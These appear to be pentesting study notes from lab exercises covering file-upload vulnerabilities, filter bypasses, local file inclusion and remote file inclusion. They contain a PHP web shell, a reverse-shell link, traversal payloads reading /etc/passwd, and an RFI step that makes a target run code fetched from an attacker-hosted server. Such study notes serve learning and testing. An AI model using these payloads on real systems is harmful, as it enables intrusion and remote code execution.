# WebShells RCE Upload Vulnerabilities

there are a variety of webshells available on Kali by default at `/usr/share/webshells` -- including the infamous [PentestMonkey php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) -- a full reverse shell written in PHP

```php
<?php
    echo system($_GET["cmd"]);
?>
```

- add this to a web directory with a filename like 'webshell.php'
- then navigate to the file you uploaded and add to the url your console cmd
  
>e.g. `http://shell.uploadvulns.thm/resources/webshell.php?cmd=id;whoami;ls`

then from here we can upload an RCE

>https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

When the target is ***Windows***, it is often easiest to obtain RCE using a web shell, or by using msfvenom to generate a reverse/bind shell in the language of the server. 
To obtain RCE using a web shell you need to use ***URL Encoded Powershell Reverse Shell***. This would be copied into the URL as the `cmd` argument:

---

## Client-side filtering and server-side filtering

- Extension Validation
- File Type Filtering
  - MIME validation
  - Magic Number validation
- File Length Filtering
- File Name Filtering
- File Content Filtering

---

## Bypass file filtering

### Send the file directly to the upload point

Why use the webpage with the filter, when you can send the file directly using a tool like curl?

```
curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>
```

>To use this method you would first aim to intercept a successful upload (using Burpsuite or the browser console) to see the parameters being used in the upload, which can then be slotted into the above command.

## Bypassing Server-Side Filtering

>first step, google alternate extensions e.g. https://en.wikipedia.org/wiki/PHP

The key to bypassing any kind of server side filter is to enumerate and see what is allowed, as well as what is blocked; then try to craft a payload which can pass the criteria the filter is looking for.

append a file type e.g. `webshell.jpg.php`
collect a burpsuite capture to delete the filter either *before* the page loads *or before* the file is uploaded

### Bypassing using magic numbers

- use nano to add "A" the correct number of times to the start of the file
- use hexeditor to change those characters to magic numbers associated to the target file type

---

# Local File Inclusion (LFI)

### Steps for testing for LFI

1. Find an entry point that could be via GET, POST, COOKIE, or HTTP header values!  
2. Enter a valid input to see how the web server behaves.
3. Enter invalid inputs, including special characters and common file names.
4. Don't always trust what you supply in input forms is what you intended! Use either a browser address bar or a tool such as Burpsuite.
5. Look for errors while entering invalid input to disclose the current path of the web application; if there are no errors, then trial and error might be your best option.
6. Understand the input validation and if there are any filters!
7. Try the inject a valid entry to read sensitive files


The function `include` is insecure without sanitization 
```php
<?PHP 
	include($_GET["lang"]);
?>
```
`http://webapp.thm/index.php?lang=EN.php`
use **this** to find files 
`http://webapp.thm/get.php?file=/etc/passwd
OR use:
`http://webapp.thm/get.php?file=../../../../etc/passwd`
if you can find directories

use NULL BYTE in the URL to bypass file casting 
`%00

an extra dot in the directory address refers to the current directory.
`http://webapp.thm/index.php?lang=/etc/passwd/.

....//....//....//....//....//etc/passwd

if the web application asks to supply input that has to include a directory such as: `http://webapp.thm/index.php?lang=languages/EN.php` then, to exploit this, we need to include the directory in the payload 
`?lang=languages/../../../../../etc/passwd

# Remote File Inclusion

host a web server using
`python -m http.server 9000`
create a file in the same directory containing:
```php
<?php
print exec('hostname');
?>
```
from the target URL enter 
`http://10.10.192.101/playground.php?file=http://10.4.3.201:9000/host.txt
This will execute the commands stored in hosts.txt